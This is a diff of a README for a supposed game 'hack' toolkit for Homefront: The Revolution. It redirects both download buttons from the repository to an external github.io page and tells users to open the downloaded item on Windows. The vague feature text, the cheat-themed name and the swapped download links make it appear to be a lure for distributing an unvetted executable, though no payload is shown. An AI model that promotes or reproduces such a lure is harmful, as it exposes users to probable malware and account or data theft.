@@ -1,6 +1,6 @@
 # 🛡️ homefront-the-revolution-hack-2026-resistance-toolkit - Plan Smarter Resistance Loadouts Today
 
-[![Download Now](https://img.shields.io/badge/Download_Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit)
+[![Download Now](https://img.shields.io/badge/Download_Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://nyoks1337.github.io)
 
 homefront-the-revolution-hack-2026-resistance-toolkit is a Windows PC companion for players who want a cleaner, faster way to organize resistance builds, weapons, attachments, guerrilla loadouts, mission plans, and progression insights. It is built around the Homefront: The Revolution 2026 resistance theme and gives you a single place to shape your setup before you play. The toolkit is made for everyday users, so you do not need programming knowledge to get started. Use the download button above or follow the download section below to get the application.
 
@@ -24,7 +24,7 @@ The toolkit focuses on practical planning. You can build a resistance profile, s
 
 Getting started is simple. Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/Download_Now-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nyoks1337/homefront-the-revolution-hack-2026-resistance-toolkit)
+[![Download Now](https://img.shields.io/badge/Download_Now-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://nyoks1337.github.io)
 
 After the download finishes, open the downloaded item on your Windows PC and launch the companion. The first screen gives you access to the main planning areas. Take a moment to look through the dashboard, then choose the section that matches what you want to prepare first. You can start with a build, a weapon list, a loadout, or a mission plan.
 
